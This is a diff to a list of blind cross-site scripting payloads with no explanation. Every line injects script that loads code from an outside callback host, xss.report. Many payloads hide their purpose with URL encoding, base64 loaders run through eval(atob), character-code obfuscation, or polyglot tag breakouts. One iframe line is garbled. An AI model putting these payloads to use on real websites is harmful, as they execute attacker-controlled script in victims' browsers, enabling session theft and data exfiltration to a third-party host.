@@ -1,8 +1,10 @@
 '"><script src=https://xss.report/c/habib></script>
-'"></title></textarea></script></style></noscript><script src=https://xss.report/c/habib></script>
 '%22%3E%3Cscript%20src=https://xss.report/c/habib%3E%3C/script%3E
+%27%22%3Csvg%2Fonload%3D%22window.location.href%3D%27https%3A%2F%2Fxss.report%2Fc%2Fhabib%27%22%3E
+%27%22%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Fnoscript%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhabib%3E%3C%2Fscript%3E
 "><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/habib&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
-'"><Svg Src=//xss.report/c/habib/s OnLoad=import(this.getAttribute('src')+0)>
-%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hhYmliIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;%20onerror=eval(atob(this.id))%3E
-%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//xss.report/c/habib%22);a.send();%3C/script%3E
-%22%3E%3Cinput%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hhYmliIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;%20autofocus%3E
+%2522%253E%253Cinput%2520onfocus%3Deval%28atob%28this.id%29%29%2520id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%2520autofocus%253E
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
+%27%22%3E%3Cimg%20src%3Dx%20onerror%3DsetTimeout%28String.fromCharCode%28102%2C101%2C116%2C99%2C104%29%2B%27%28%22https%3A%2F%2Fxss.report%2Fc%2Fhabib%22%29%27%2C%200%29%3E
+%27%2F%2A%5C%27%2F%2A%22%2F%2A%5C%22%2F%2A%3C%2FScript%3E%3CInput%2FAutoFocus%2FOnFocus%3D%2F%2A%2A%2F%28import%28%2Fhttps%3Ahttps%3A%2F%2Fxss.report%2Fc%2Fhabib%5C00%3F1%3D1290%2F.source%29%29%2F%2F%3E
+javascript:%22/*'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Chabib/.source))//%3E
